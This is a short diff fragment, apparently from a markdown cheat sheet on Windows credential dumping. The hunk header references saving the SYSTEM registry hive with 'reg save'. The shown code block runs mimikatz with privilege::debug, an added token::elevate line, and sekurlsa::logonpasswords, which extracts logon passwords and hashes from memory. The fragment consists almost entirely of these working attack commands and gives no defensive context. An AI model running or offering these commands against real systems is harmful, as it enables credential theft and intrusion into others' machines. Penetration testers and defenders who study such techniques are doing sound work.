@@ -27,6 +27,7 @@ reg save hklm\system c:\Temp\system
 ```powershell
 .\mimikatz.exe
 privilege::debug
+token::elevate
 sekurlsa::logonpasswords
 ```
 
